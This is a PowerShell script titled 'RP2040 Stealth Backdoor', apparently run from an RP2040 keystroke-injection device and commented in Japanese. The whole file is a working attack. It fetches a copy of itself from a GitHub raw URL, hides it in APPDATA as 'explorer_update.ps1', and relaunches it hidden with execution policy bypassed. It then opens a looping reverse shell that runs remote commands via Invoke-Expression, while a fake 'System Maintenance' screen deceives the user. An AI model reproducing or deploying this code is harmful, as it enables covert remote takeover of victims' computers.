# --- RP2040 Stealth Backdoor (LED Feedback Version) ---
# GitHub: 0rnot/RP2040/main/backdoor.ps1

param(
    [string]$LHOST = "192.168.0.248",
    [int]$LPORT = 4444,
    [switch]$Background
)

# --- エラーをRP2040に通知する関数 ---
function Send-ErrorToRP2040($code) {
    # CIRCUITPYというラベルのドライブを探す
    $drive = Get-Volume -FileSystemLabel "CIRCUITPY" | Select-Object -ExpandProperty DriveLetter -ErrorAction SilentlyContinue
    if ($drive) {
        $errorFile = "$($drive):\error.txt"
        Set-Content -Path $errorFile -Value $code -Force
    }
}

function Start-ReverseShell {
    param($LHOST, $LPORT, $Background)

    $DestPath = "$env:APPDATA\Microsoft\Windows\explorer_update.ps1"

    if ($Background) {
        while ($true) {
            try {
                $TCPClient = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
                $Stream = $TCPClient.GetStream()
                $Writer = New-Object System.IO.StreamWriter($Stream); $Writer.AutoFlush = $true
                $Reader = New-Object System.IO.StreamReader($Stream)
                $Writer.WriteLine("--- RP2040 Session Established ---")
                while($TCPClient.Connected) {
                    if($Stream.DataAvailable) {
                        $Command = $Reader.ReadLine()
                        if ($Command -eq "exit") { break }
                        $Result = Invoke-Expression $Command 2>&1 | Out-String
                        $Writer.WriteLine($Result)
                        $Writer.Write("PS " + (Get-Location).Path + "> ")
                    }
                    Start-Sleep -Milliseconds 100
                }
            } catch {
                # エラーコード 5: 接続失敗
                Send-ErrorToRP2040 "5"
                Start-Sleep -Seconds 30
            }
        }
        return
    }

    # デコイモード
    try {
        (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0rnot/RP2040/main/backdoor.ps1", $DestPath)
    } catch { 
        # エラーコード 3: 保存失敗
        Send-ErrorToRP2040 "3"
    }

    $Args = "-ExecutionPolicy Bypass -NoProfile -File `"$DestPath`" -LHOST $LHOST -LPORT $LPORT -Background"
    try {
        $WshShell = New-Object -ComObject WScript.Shell
        $WshShell.Run("powershell.exe $Args", 0, $false)
    } catch {
        # エラーコード 4: プロセス起動失敗
        Send-ErrorToRP2040 "4"
        Start-Process powershell.exe -ArgumentList $Args -WindowStyle Hidden
    }

    # おとり画面
    Clear-Host
    Write-Host "Windows System Maintenance" -ForegroundColor Cyan
    Write-Host "Monitoring system stability..."
    while($true) { Start-Sleep -Seconds 60 }
}

Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background:$Background
